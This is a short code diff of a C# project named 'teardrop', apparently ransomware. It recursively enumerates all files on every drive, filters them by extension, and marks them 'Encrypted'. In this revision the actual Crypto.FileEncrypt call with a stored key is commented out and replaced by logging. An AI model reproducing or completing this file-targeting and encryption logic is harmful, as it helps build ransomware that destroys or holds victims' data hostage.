@@ -52,7 +52,8 @@ namespace teardrop
 
         public static List<string> drives = new List<string>();
         public static List<string> files = new List<string>();
-        
+
+
         public void GetFiles()
         {
             try
@@ -65,11 +66,13 @@ namespace teardrop
                     {
                         write("Found drive " + drive.Name);
                         write("Getting Files of Drive " + drive.Name);
-                        files.AddRange(Directory.EnumerateFiles(drive.Name, "*", SearchOption.AllDirectories));
+
+                        files.AddRange(Directory.EnumerateFiles(drive.Name, "*", 
+                            SearchOption.AllDirectories));
                     }
                     catch (Exception ex1)
                     {
-
+                        write("ex1 " + ex1.Message);
                     }
                 }
             }
@@ -95,7 +98,8 @@ namespace teardrop
                     };
 
                     if (validExtensions.Contains(ext)){
-                        write(s);
+                        //Crypto.FileEncrypt(s, Properties.Settings.Default.key);
+                        write("Encrypted " + s);
                     }
                 }
 
